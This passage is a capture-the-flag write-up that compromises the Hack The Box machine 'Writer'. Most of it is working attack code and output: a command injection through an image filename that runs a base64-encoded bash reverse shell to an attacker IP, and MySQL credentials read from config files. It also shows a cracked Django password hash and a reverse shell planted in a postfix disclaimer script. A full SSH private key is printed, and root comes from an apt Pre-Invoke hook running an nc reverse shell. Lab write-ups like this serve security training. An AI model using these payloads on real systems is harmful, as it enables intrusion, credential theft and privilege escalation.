		error = "File extensions must be in .jpg!"
		return render_template('edit.html', error=error, results=results, id=id)
	title = request.form.get('title')
	tagline = request.form.get('tagline')
	content = request.form.get('content')
	cursor = connector.cursor()
	cursor.execute("UPDATE stories SET title = %(title)s, tagline = %(tagline)s, content = %(content)s WHERE id = %(id)s", {'title':title, 'tagline':tagline, 'content':content, 'id': id})
	result = connector.commit()
	return redirect('/dashboard/stories')

    else:
	cursor = connector.cursor()
	cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
	results = cursor.fetchall()
	return render_template('edit.html', results=results, id=id)

@app.route('/dashboard/stories/delete/<id>', methods=['GET', 'POST'])
def delete_story(id):
    if not ('user' in session):
	return redirect('/')
    try:
	connector = connections()
    except mysql.connector.Error as err:
	    return ("Database error")
    if request.method == "POST":
	cursor = connector.cursor()
	cursor.execute("DELETE FROM stories WHERE id = %(id)s;", {'id': id})
	result = connector.commit()
	return redirect('/dashboard/stories')
    else:
	cursor = connector.cursor()
	cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
	results = cursor.fetchall()
	return render_template('delete.html', results=results, id=id)

#Define user page for dashboard
@app.route('/dashboard/users')
def users():
    if not ('user' in session):
	return redirect('/')
    try:
	connector = connections()
    except mysql.connector.Error as err:
	return "Database Error"
    cursor = connector.cursor()
    sql_command = "SELECT * FROM users;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('users.html', results=results)

#Define settings page
@app.route('/dashboard/settings', methods=['GET'])
def settings():
    if not ('user' in session):
	return redirect('/')
    try:
	connector = connections()
    except mysql.connector.Error as err:
	return "Database Error!"
    cursor = connector.cursor()
    sql_command = "SELECT * FROM site WHERE id = 1"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('settings.html', results=results)

#Define authentication mechanism
@app.route('/administrative', methods=['POST', 'GET'])
def login_page():
    if ('user' in session):
	return redirect('/dashboard')
    if request.method == "POST":
	username = request.form.get('uname')
	password = request.form.get('password')
	password = hashlib.md5(password.encode('utf-8')).hexdigest()
	try:
	    connector = connections()
	except mysql.connector.Error as err:
	    return ("Database error")
	try:
	    cursor = connector.cursor()
	    sql_command = "Select * From users Where username = '%s' And password = '%s'" % (username, password)
	    cursor.execute(sql_command)
	    results = cursor.fetchall()
	    for result in results:
		print("Got result")
	    if result and len(result) != 0:
		session['user'] = username
		return render_template('success.html', results=results)
	    else:
		error = "Incorrect credentials supplied"
		return render_template('login.html', error=error)
	except:
	    error = "Incorrect credentials supplied"
	    return render_template('login.html', error=error)
    else:
	return render_template('login.html')

@app.route("/logout")
def logout():
    if not ('user' in session):
	return redirect('/')
    session.pop('user')
    return redirect('/')

if __name__ == '__main__':
   app.run("0.0.0.0")
```
WOAH it's a long file so let's just glaze through it and see if we can find something intresting.
Just looking at the imported library we can see that it is importing OS so that's intresting so just look for the instance of  OS only to see if we have code execution somewhere.
Looking for os.system which basically executes the bash commands we find this piece of code.
```python
if request.form.get('image_url'):
	    image_url = request.form.get('image_url')
	    if ".jpg" in image_url:
		try:
		    local_filename, headers = urllib.request.urlretrieve(image_url)
		    os.system("mv {} {}.jpg".format(local_filename, local_filename))
		    image = "{}.jpg".format(local_filename)
		    try:
			im = Image.open(image) 
			im.verify()
			im.close()
			image = image.replace('/tmp/','')
			os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
			image = "/img/{}".format(image)
		    except PIL.UnidentifiedImageError:
			os.system("rm {}".format(image))
			error = "Not a valid image file!"
			return render_template('add.html', error=error)
```
So looks like we have command injection in the name of the image as it is sending the filename directly to system command without sanatizing it but we have to be careful about the speacial chars so it doesn't break the command in between so I will base64 encode it to be safe.
## Generating file with malicious name
```bash
kali@kali:~/HackTheBox/Writer$ echo -n "bash -c 'bash -i >& /dev/tcp/<YOUR IP>/<PORT> 0>&1'" | base64
YmFzaCAtYyAnY<---SNIP--->=
kali@kali:~/HackTheBox/Writer$ touch '1.jpg; `echo <YOUR BASE64 ENCODED PAYLOAD> | base64 -d | bash `;'
kali@kali:~/HackTheBox/Writer$ ls
'1.jpg; `echo YmFzaCAtYyAnYmFz<---SNIP--->= | base64 -d | bash `;'   ffuf.log      me.jpg      nmap.nmap   sqlmap.log
 enum4linux.log                                                                                             intial.nmap   nikto.log   r.txt       user.txt
kali@kali:~/HackTheBox/Writer$
```
Now that we have that file we have to upload it but before doing that start your nc listener.
So now pick any of exsisting story and edit it and change the image file with your image file.
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210805114506.png)
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210805114540.png)
After you did that then you have to trigger that mv {} {} command by going to edit and changing the image url.
Now  intercept the the edit of the same story with the burp.
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210805114825.png)
Now change the higlighted feild with the name of the malicious file.
But you  have to give the local location of the filename so you know the base directory of the installation and from ffuf directorty fuzzing above we know that images are saved in /static.
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210805115327.png)
and boom you can see our file so let's write a local path for this file.
```
file:///var/www/writer.htb/writer/static/img/1.jpg; `echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOS80NDMgMD4mMSc= | base64 -d | bash `;
```
so let's change this as image url and add '#' sign at end so it ignores everything after our commands get executed.
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210805120001.png)
And boom we have the REVSHELL.
```bash
kali@kali:~/HackTheBox/Writer$ sudo rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [<--SNIP-->] from (UNKNOWN) [<--SNIP-->] 40122
bash: cannot set terminal process group (1052): Inappropriate ioctl for device
bash: no job control in this shell
www-data@writer:/$
```
# Getting user
## Enumeration
Looking for services just on localhost
### ss -tupln
```bash
ss -tupln
Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   Process                                                                         
udp     UNCONN   0        0          127.0.0.53%lo:53            0.0.0.0:*                                                                                      
udp     UNCONN   0        0           10.10.11.255:137           0.0.0.0:*                                                                                      
udp     UNCONN   0        0           10.10.11.101:137           0.0.0.0:*                                                                                      
udp     UNCONN   0        0                0.0.0.0:137           0.0.0.0:*                                                                                      
udp     UNCONN   0        0           10.10.11.255:138           0.0.0.0:*                                                                                      
udp     UNCONN   0        0           10.10.11.101:138           0.0.0.0:*                                                                                      
udp     UNCONN   0        0                0.0.0.0:138           0.0.0.0:*                                                                                      
tcp     LISTEN   0        80             127.0.0.1:3306          0.0.0.0:*                                                                                      
tcp     LISTEN   0        50               0.0.0.0:139           0.0.0.0:*                                                                                      
tcp     LISTEN   0        10             127.0.0.1:8080          0.0.0.0:*       users:(("python3",pid=3262,fd=4))                                              
tcp     LISTEN   0        4096       127.0.0.53%lo:53            0.0.0.0:*                                                                                      
tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*                                                                                      
tcp     LISTEN   0        100            127.0.0.1:25            0.0.0.0:*                                                                                      
tcp     LISTEN   0        50               0.0.0.0:445           0.0.0.0:*                                                                                      
tcp     LISTEN   0        50                  [::]:139              [::]:*                                                                                      
tcp     LISTEN   0        511                    *:80                  *:*                                                                                      
tcp     LISTEN   0        128                 [::]:22               [::]:*                                                                                      
tcp     LISTEN   0        50                  [::]:445              [::]:*     
```
So we have mysql db so let's try to read it's conf files.
```bash
www-data@writer:$ cd /etc/mysql
www-data@writer:/etc/mysql$ ls
conf.d
debian-start
debian.cnf
mariadb.cnf
mariadb.conf.d
my.cnf
my.cnf.fallback
www-data@writer:/etc/mysql$ cat mariadb.cnf
# The MariaDB configuration file
#
# The MariaDB/MySQL tools read configuration files in the following order:
# 1. "/etc/mysql/mariadb.cnf" (this file) to set global defaults,
# 2. "/etc/mysql/conf.d/*.cnf" to set global options.
# 3. "/etc/mysql/mariadb.conf.d/*.cnf" to set MariaDB-only options.
# 4. "~/.my.cnf" to set user-specific options.
#
# If the same option is defined multiple times, the last one will apply.
#
# One can use all long options that the program supports.
# Run program with --help to get a list of available options and with
# --print-defaults to see which it would actually understand and use.

#
# This group is read both both by the client and the server
# use it for options that affect everything
#
[client-server]

# Import all .cnf files from configuration directory
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

[client]
database = dev
user = djangouser
password = DjangoSuperPassword
default-character-set = utf8
```
we have username and password to login so let's try that.
```sql
www-data@writer:/etc/mysql$ mysql -u djangouser -h 127.0.0.1 -p 
DjangoSuperPassword

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 49
Server version: 10.3.29-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [dev]> show databases;
+--------------------+
| Database           |
+--------------------+
| dev                |
| information_schema |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [dev]> use dev;
Database changed
MariaDB [dev]> show tables;
+----------------------------+
| Tables_in_dev              |
+----------------------------+
| auth_group                 |
| auth_group_permissions     |
| auth_permission            |
| auth_user                  |
| auth_user_groups           |
| auth_user_user_permissions |
| django_admin_log           |
| django_content_type        |
| django_migrations          |
| django_session             |
+----------------------------+
10 rows in set (0.001 sec)

MariaDB [dev]> SELECT * FROM auth_user;
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
| id | password                                                                                 | last_login | is_superuser | username | first_name | last_name | email           | is_staff | is_active | date_joined                |
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
|  1 | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= | NULL       |            1 | kyle     |            |           | kyle@writer.htb |        1 |         1 | 2021-05-19 12:41:37.168368 |
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
1 row in set (0.001 sec)
```
So we have kyle hash now let's try to crack it.
```bash
kali@kali:~/HackTheBox/Writer$ hashcat -a 0 -m 10000 hash --wordlist /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Pentium(R) CPU  N3700  @ 1.60GHz, 1392/1456 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Django (PBKDF2-SHA256)
Hash.Target......: pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8...uXM4A=
Time.Started.....: Thu Aug  5 02:46:45 2021 (18 mins, 29 secs)
Time.Estimated...: Thu Aug  5 03:05:14 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:        8 H/s (3.11ms) @ Accel:32 Loops:128 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 9408/14344385 (0.07%)
Rejected.........: 0/9408 (0.00%)
Restore.Point....: 9344/14344385 (0.07%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:259968-259999
Candidates.#1....: jodete -> 120287

Started: Thu Aug  5 02:46:39 2021
Stopped: Thu Aug  5 03:05:16 2021
```
and we have the password let's ssh as kyle.
# Kyle to John
```bash
kali@kali:~/HackTheBox/Writer$ ssh kyle@writer.htb
kyle@writer.htb's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu  5 Aug 07:09:14 UTC 2021

  System load:           0.0
  Usage of /:            63.9% of 6.82GB
  Memory usage:          25%
  Swap usage:            0%
  Processes:             262
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.101
  IPv6 address for eth0: dead:beef::250:56ff:feb9:c87c

 * Pure upstream Kubernetes 1.21, smallest, simplest cluster ops!

     https://microk8s.io/

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Aug  5 07:07:06 2021 from 10.10.14.19
kyle@writer:~$
```
## Enumeration
### Pspy64
```bash
pipe -n dfilt -t unix flags=Rq user=john argv=/etc/postfix/disclaimer -f ${sender} -- ${recipient} 
/bin/sh /etc/postfix/disclaimer -f kyle@writer.htb -- kyle@writer.htb
python3 sendmail.py
```
This were the few intresting thing from pspy64 so now let's understand how sendmail works.
There are few files we have to check to understand what is happening around so first let's check disclaimer.
```bash
kyle@writer:~$ cat disclaimer
#!/bin/bash
# Localize these.

INSPECT_DIR=/var/spool/filter
SENDMAIL=/usr/sbin/sendmail

# Get disclaimer addresses
DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses

# Exit codes from <sysexits.h>
EX_TEMPFAIL=75
EX_UNAVAILABLE=69

# Clean up when done or when aborting.
trap "rm -f in.$$" 0 1 2 3 15

# Start processing.
cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit
$EX_TEMPFAIL; }

cat >in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; }

# obtain From address
from_address=`grep -m 1 "From:" in.$$ | cut -d "<" -f 2 | cut -d ">" -f 1`

if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then
  /usr/bin/altermime --input=in.$$ \
                   --disclaimer=/etc/postfix/disclaimer.txt \
                   --disclaimer-html=/etc/postfix/disclaimer.txt \
                   --xheader="X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm" || \
                    { echo Message content rejected; exit $EX_UNAVAILABLE; }
fi

$SENDMAIL "$@" <in.$$

exit $?
```
Looks like we have a bash script that gets executed to get some sanity checks when we send a mail so let's add a revshell line in it and then trigger it.
EDITED DISCLAIMER FILE.
```bash
kyle@writer:~$ cat disclaimer
#!/bin/bash
# Localize these.

bash -i &>/dev/tcp/<YOUR IP>/<PORT> 0>&1
INSPECT_DIR=/var/spool/filter
SENDMAIL=/usr/sbin/sendmail

# Get disclaimer addresses
DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses

# Exit codes from <sysexits.h>
EX_TEMPFAIL=75
EX_UNAVAILABLE=69

# Clean up when done or when aborting.
trap "rm -f in.$$" 0 1 2 3 15

# Start processing.
cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit
$EX_TEMPFAIL; }

cat >in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; }

# obtain From address
from_address=`grep -m 1 "From:" in.$$ | cut -d "<" -f 2 | cut -d ">" -f 1`

if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then
  /usr/bin/altermime --input=in.$$ \
                   --disclaimer=/etc/postfix/disclaimer.txt \
                   --disclaimer-html=/etc/postfix/disclaimer.txt \
                   --xheader="X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm" || \
                    { echo Message content rejected; exit $EX_UNAVAILABLE; }
fi

$SENDMAIL "$@" <in.$$

exit $?
```
Now let's copy this file to /etc/postfix.
And then try to send mail you can do it manually using nc and telnet.
```bash
kyle@writer:/dev/shm$ cp disclaimer /etc/postfix/disclaimer
kyle@writer:/dev/shm$ nc 127.0.0.1 25
220 writer.htb ESMTP Postfix (Ubuntu)
HELO writer.htb                
250 writer.htb
MAIL FROM: kyle@writer.htb
250 2.1.0 Ok
RCPT TO: john@writer.htb
250 2.1.5 Ok
DATA
From: kyle@writer.htb
To: john@writer.htb
Subject: Test
Date: Thu, 20 Dec 2012 12:00:00 +0000

Testing
.354 End data with <CR><LF>.<CR><LF>

250 2.0.0 Ok: queued as 41B40838
QUIT
221 2.0.0 Bye
EXIT
kyle@writer:/dev/shm$ 
```
But to be fast and not doing it repeatedly I wrote a simple python script to do this stuff for me.
```python
#!/usr/bin/env python3

import smtplib

host = '127.0.0.1'
port = 25

From = 'kyle@writer.htb'
To = 'john@writer.htb'

Message = '''\
        Subject: HI THERE! JOHN

        OOPS I GOT YOU MATE.
'''

try:
        io = smtplib.SMTP(host,port)
        io.ehlo()
        io.sendmail(From,To,Message)
except Exceptions as e:
        print (e)
finally:
        io.quit()
```
and then run the following command.
```bash
kyle@writer:/dev/shm$ cp disclaimer /etc/postfix/disclaimer && python3 script.py
```
the disclaimer is the edited disclaimer file and then sending mail.
and boom we have shell as john.
```bash
kali@kali:~/HackTheBox/Writer$ sudo rlwrap nc -nlvp 443
[sudo] password for kali: 
listening on [any] 443 ...
connect to [<--SNIP-->] from (UNKNOWN) [<--SNIP-->] 41320
bash: cannot set terminal process group (372744): Inappropriate ioctl for device
bash: no job control in this shell
id
id
uid=1001(john) gid=1001(john) groups=1001(john)
john@writer:/var/spool/postfix$
```
# PrivESC
## Stabilizing the shell
```bash
john@writer:/var/spool/postfix$ cd /home/john
john@writer:/var/spool/postfix$ ls -al
drwxr-xr-x 4 john john 4096 Aug  5 10:19 .
drwxr-xr-x 4 root root 4096 Jul  9 10:59 ..
lrwxrwxrwx 1 root root    9 May 19 22:20 .bash_history -> /dev/null
-rw-r--r-- 1 john john  220 May 14 18:19 .bash_logout
-rw-r--r-- 1 john john 3771 May 14 18:19 .bashrc
drwx------ 2 john john 4096 Jul 28 09:19 .cache
-rw-r--r-- 1 john john  807 May 14 18:19 .profile
drwx------ 2 john john 4096 Jul  9 12:29 .ssh
-rw------- 1 john john 2751 Aug  5 10:19 .viminfo
john@writer:/var/spool/postfix$ cd .ssh
john@writer:/var/spool/postfix$ ls
authorized_keys
id_rsa
id_rsa.pub
john@writer:/var/spool/postfix$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
Now we have john ssh so let's login as  john
```bash
kali@kali:~/HackTheBox/Writer$ ssh -i id_rsa john@writer.htb 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 2.0


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Aug  5 13:36:13 2021 from 10.10.14.59
john@writer:~$ id
uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
```
## Enumeration
We can see that we are in management group so let's see what files and directory we can access.
```bash
john@writer:/etc/apt$ find / -group management 2>/dev/null
/etc/apt/apt.conf.d
```
ooo this is intresting.
searching for 'writable files in /etc/apt/apt.conf.d privESC' in google we can find the below article which explains gretaly what we have to do to abuse that for privESC.
https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/
Looking through the article there should be something running 'sudo apt-get update' command so let's see if there is anything running that command using pspy64.
```bash
john@writer:/home/kyle$ ./pspy64s -pf  -i 1000 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scannning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
<--SNIP-->
2021/08/05 16:51:06 CMD: UID=0    PID=374426 | /usr/bin/apt-get update
2021/08/05 16:51:06 CMD: UID=0    PID=374417 | /usr/bin/apt-get update
2021/08/05 16:51:06 CMD: UID=0    PID=374411 | /bin/sh -c /usr/bin/apt-get update
2021/08/05 16:51:06 CMD: UID=0    PID=374406 | /usr/sbin/CRON -f
<--SNIP-->
```
So now we have the prerequiste satify so we can start with exploitation.
## Exploitation
so we have can create a malicious line in /etc/apt/apt.conf.d/ to get command execution so let's do that before that spin up the listener on your fav port.
And the let's create a file that gets us the reverse shell.
```bash
john@writer:~$ echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR IP> <PORT> >/tmp/f"};' > /etc/apt/apt.conf.d/oops
```
and boom we have the shell.
```bash
kali@kali:~/HackTheBox/Writer$ sudo rlwrap nc -nlvp 443
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.11.101] 55636
/bin/sh: 0: can't access tty; job control turned off
id
uid=0(root) gid=0(root) groups=0(root)
# 
```
Now we are root let's get all the flags.


# IF YOU LIKE THE WRITEUP GIVE Rep+
Profie Link: [<img src="http://www.hackthebox.eu/badge/image/387509" alt="Hack The Box"/>](https://app.hackthebox.eu/profile/387509)

